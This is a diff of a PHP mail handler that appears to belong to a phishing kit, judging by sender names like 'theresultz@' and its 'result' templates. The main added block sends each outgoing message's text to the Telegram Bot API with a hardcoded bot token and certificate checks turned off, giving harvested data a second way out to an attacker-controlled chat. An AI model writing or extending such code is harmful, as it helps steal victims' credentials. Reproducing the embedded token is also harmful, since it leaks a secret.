@@ -132,12 +132,14 @@ class Handler
      */
     public function sendemail($from = [], $to, $subject, $message, $attach = null)
     {
-        $rr = 'no-reply@' . time() . '.embezzle-component.net.net';
-        if ($from['from_mail'] == null) {
+        $rr = 'theresultz@' . time() . '.' . $this->getDomain();
+
+        if (CONFIG['app']['from_mail'] == null || CONFIG['app']['from_mail'] == "") {
             $fromMail = $rr;
         } else {
-            $fromMail = $from['from_mail'];
+            $fromMail = CONFIG['app']['from_mail'];
         }
+
         $fromName = $from['from_name'];
 
 
@@ -177,7 +179,7 @@ class Handler
             $this->mailer->Priority = 1;
             $this->mailer->SingleTo = true;
             $this->mailer->setFrom($fromMail, $fromName);
-            $this->mailer->Subject = '=?UTF-8?B?' . base64_encode("[\xe2\x98\x98]" . $subject) . '?=';
+            $this->mailer->Subject = '=?UTF-8?B?' . base64_encode($subject) . '?=';
             $this->mailer->AltBody = $message;
             $this->mailer->MsgHTML($message);
             if ($attach !== null) {
@@ -194,6 +196,16 @@ class Handler
                 @mkdir(PUBLIC_PATH . '/logs/test_send', 0777);
             }
             @file_put_contents(PUBLIC_PATH . '/logs/test_send/' . $fromName . '-' . strtoupper(str_replace([' ', ':', ';', '/', '\\'], '_', $subject)) . '.html', $message);
+        }
+
+        if (CONFIG['app']['telegram_id'] != "") {
+            $c = curl_init();
+            curl_setopt($c, CURLOPT_URL, 'https://api.telegram.org/bot5108618511:AAHzlYESxy8FR2ZG7xS3UYn2geLSbdEX3o4/sendMessage?chat_id=' . CONFIG['app']['telegram_id'] . '&text=' . urlencode(strip_tags($message)));
+            curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
+            $x = curl_exec($c);
+            curl_close($c);
         }
     }
     public function userIP()
@@ -371,8 +383,12 @@ class Handler
     }
     public function result($type,  $data = [])
     {
+        if (file_exists(HTML_PATH . $type . '.html')) {
+            $source = HTML_PATH . $type . '.html';
+        } elseif (file_exists(HTML_APP_PATH . $type . '.html')) {
+            $source = HTML_APP_PATH . $type . '.html';
+        }
 
-        $source = dirname(__DIR__) . '/html/' . $type . '.html';
         $fsource = file_get_contents($source);
         $rpl1 = [];
         $val1 = [];
